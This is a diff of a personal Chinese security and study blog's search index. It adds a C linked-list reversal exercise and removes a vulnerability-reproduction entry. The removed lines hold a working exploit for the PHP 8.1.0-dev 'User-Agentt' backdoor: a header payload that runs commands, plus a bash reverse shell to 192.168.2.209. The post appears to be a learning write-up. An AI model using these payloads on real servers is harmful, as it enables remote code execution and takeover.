@@ -2673,7 +2673,12 @@
 <li><p>函数参数传递的主要方式</p>
 </li>
 </ol>
-<h1 id="第二章-线性表"><a href="#第二章-线性表" class="headerlink" title="第二章 线性表"></a>第二章 线性表</h1>]]></content>
+<h1 id="第二章-线性表"><a href="#第二章-线性表" class="headerlink" title="第二章 线性表"></a>第二章 线性表</h1><p>本题要求实现一个函数，将给定的单链表逆转。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElementType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PtrToNode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    ElementType Data;</span><br><span class="line">    PtrToNode   Next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> PtrToNode List;</span><br><span class="line"></span><br><span class="line">List <span class="title function_">Read</span><span class="params">()</span>; <span class="comment">/* 细节在此不表 */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">( List L )</span>; <span class="comment">/* 细节在此不表 */</span></span><br><span class="line"></span><br><span class="line">List <span class="title function_">Reverse</span><span class="params">( List L )</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    List L1, L2;</span><br><span class="line">    L1 = Read();</span><br><span class="line">    L2 = Reverse(L1);</span><br><span class="line">    Print(L1);</span><br><span class="line">    Print(L2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br><span class="line">List <span class="title function_">Reverse</span><span class="params">(List head)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;Next == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> head; </span><br><span class="line">    &#125;</span><br><span class="line">    List p;</span><br><span class="line">    List pcur;</span><br><span class="line">    List r;</span><br><span class="line">    p = head;</span><br><span class="line">    pcur = head-&gt;Next;</span><br><span class="line">    head-&gt;Next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(pcur)</span><br><span class="line">    &#123;</span><br><span class="line">        r = pcur-&gt;Next;</span><br><span class="line">        pcur-&gt;Next = p;</span><br><span class="line">        p = pcur;</span><br><span class="line">        pcur = r;</span><br><span class="line">    &#125;</span><br><span class="line">    head=p;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
   </entry>
   <entry>
     <title>buu_misc</title>
@@ -4376,23 +4381,6 @@ create table student3 select * from student;  #创建 student3 并复制student�
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
 
 <p>内核提权没提出来</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>漏洞复现</title>
-    <url>/2023/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2023/09/28/12a6658fd65d2835.png"></p>
-<span id="more"></span>
-
-<h2 id="PHP-8-1-0-dev-User-Agentt-Backdoor"><a href="#PHP-8-1-0-dev-User-Agentt-Backdoor" class="headerlink" title="PHP 8.1.0-dev User-Agentt Backdoor"></a>PHP 8.1.0-dev User-Agentt Backdoor</h2><p>PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送<strong>User-Agentt</strong>头来执行任意代码。</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/09/28/94cd18e43a4e8602.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.2.209/80 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>直接给出root权限</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/09/28/d748c5eada6bfe09.png"></p>
 ]]></content>
   </entry>
   <entry>
